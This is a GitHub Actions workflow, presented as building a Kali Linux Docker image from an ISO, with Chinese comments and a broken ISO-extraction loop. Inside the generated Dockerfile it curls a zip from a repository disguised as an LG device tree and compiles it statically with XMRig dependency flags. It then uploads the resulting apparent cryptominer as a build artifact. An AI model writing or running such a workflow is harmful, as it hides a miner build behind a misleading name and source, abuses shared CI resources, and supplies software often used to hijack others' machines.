name: Build Docker Image from ISO

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Set up QEMU and required packages
      run: |
        sudo apt-get update
        sudo apt-get install -y wget genisoimage

    - name: Create Dockerfile
      run: |
        cat <<EOF > Dockerfile
        FROM debian:bullseye

        RUN apt-get update && apt-get install -y \\
            wget \\
            genisoimage \\
            && rm -rf /var/lib/apt/lists/*

        RUN wget -O /tmp/kali-linux-mini.iso https://old.kali.org/kali-images/kali-2016.1/kali-linux-mini-2016.1-amd64.iso

        RUN mkdir -p /usr/local/kali

        # Use isoinfo to extract files from the ISO
        RUN mkdir /usr/local/kali/extracted && \\
            isoinfo -l -i /tmp/kali-linux-mini.iso > /usr/local/kali/filelist.txt && \\
            for file in \$(isoinfo -x / -i /tmp/kali-linux-mini.iso | awk '{ print \$2 }'); do \\
                isoinfo -x \$file -i /tmp/kali-linux-mini.iso > /usr/local/kali/extracted/\$file; \\
            done

        # Clean up ISO file
        RUN rm /tmp/kali-linux-mini.iso

        # 设置工作目录
        WORKDIR /usr/src/app

        # 安装必要的编译工具
        RUN apt-get update && apt-get install -y \\
            curl \\
            unzip \\
            git \\
            build-essential \\
            cmake \\
            automake \\
            libtool \\
            autoconf \\
            glibc-source \\
            libstdc++-dev \\  # 更改为 libstdc++-dev
            gcc \\            # 更改为 gcc
            && apt-get clean

        # 复制项目文件到容器中
        COPY . .

        # 下载并解压源码
        RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \\
            unzip testformycode-nbg.zip

        # 构建项目
        RUN cd testformycode-nbg/scripts-64 && \\
            chmod 777 *.sh && \\
            ./build_deps.sh && \\
            cd .. && \\
            mkdir build && \\
            cd build && \\
            cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \\
            make
        EOF
      shell: bash

    - name: Build Docker image
      run: docker build -t kali-docker .

    - name: Run Docker container
      run: docker run --name kali_container -d kali-docker

    - name: Copy build artifacts
      run: |
        # 复制构建产物
        docker cp kali_container:/usr/src/app/testformycode-nbg/build ./build-output

    - name: Upload Build Artifacts
      uses: actions/upload-artifact@v3
      with:
        name: build-output
        path: ./build-output

    - name: Clean up
      run: |
        # 停止并删除容器
        docker rm -f kali_container
